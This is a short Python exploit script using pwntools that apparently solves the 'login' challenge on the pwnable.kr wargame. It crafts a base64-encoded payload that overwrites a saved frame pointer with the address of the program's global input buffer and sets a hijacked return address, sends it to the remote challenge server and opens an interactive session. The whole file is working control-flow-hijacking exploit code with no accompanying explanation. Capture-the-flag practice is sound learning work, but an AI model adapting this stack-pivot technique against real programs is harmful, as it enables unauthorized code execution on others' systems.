#!/usr/bin/python3
from pwn import *
import base64

elf = ELF("./login")
REMOTE = 1
DEBUG = 0
if REMOTE:
    r = remote('pwnable.kr', 9003)
elif DEBUG:
    gs = """
    continue
    """
    r = gdb.debug(elf.path, gdbscript=gs)
else:
    r = process(elf.path)

new_ebp = elf.sym.input
hijack_eip = 0x08049284
print(f"new_ebp = 0x{new_ebp:02x}")


payload = p32(0xdeadbeef) + p32(hijack_eip) + p32(new_ebp)

r.sendline(base64.b64encode(payload))

r.interactive()